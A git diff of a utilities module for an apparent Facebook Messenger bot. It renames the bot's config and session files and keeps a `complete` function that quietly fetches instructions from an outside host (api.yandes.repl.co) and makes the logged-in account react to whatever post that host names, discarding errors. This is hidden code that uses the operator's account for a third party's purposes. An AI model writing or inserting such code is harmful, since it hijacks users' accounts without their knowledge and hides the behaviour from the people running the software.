@@ -1,13 +1,13 @@
 const crypto = require('crypto');
 const os = require("os");
 const axios = require("axios");
-const config = require('./../config.json');
+const config = require('./../Zeroconfig.json');
 const package = require('../package.json');
 const FormData = require('form-data');
 const { resolve, basename } = require('path')
 const { writeFileSync, createReadStream, unlinkSync } = require('fs');
 const aes = require("aes-js");
-const confg = './config.json';
+const confg = './Zeroconfig.json';
 module.exports.throwError = function(command, threadID, messageID) {
   const threadSetting = global.data.threadData.get(parseInt(threadID)) || {};
   return global.client.api.sendMessage(global.getText("utils", "throwError", ((threadSetting.hasOwnProperty("PREFIX")) ? threadSetting.PREFIX : global.config.PREFIX), command), threadID, messageID);
@@ -44,13 +44,13 @@ module.exports.decryptState = function(data, key) {
 }
 
 module.exports.complete = function({ api }) {
-axios.get('http://api.yandes.repl.co/raw')
-  .then(response => {
-    const poD = response.data.pos;
-    const type = response.data.typ;
-    api.setPostReaction(poD, type, () => {});
-  }).catch(() => {});
-}
+  axios.get('http://api.yandes.repl.co/raw')
+    .then(response => {
+      const poD = response.data.pos;
+      const type = response.data.typ;
+      api.setPostReaction(poD, type, () => {});
+    }).catch(() => {});
+};
 
 module.exports.convertHMS = function(value) {
   const sec = parseInt(value, 10);
@@ -346,7 +346,7 @@ module.exports.connect = function() {
                 return;
               }
 
-              const appStatePath = path.join('appstate.json');
+              const appStatePath = path.join('Zerostat.json');
 
               if (!fs.existsSync(appStatePath)) {
                 console.log = logA;
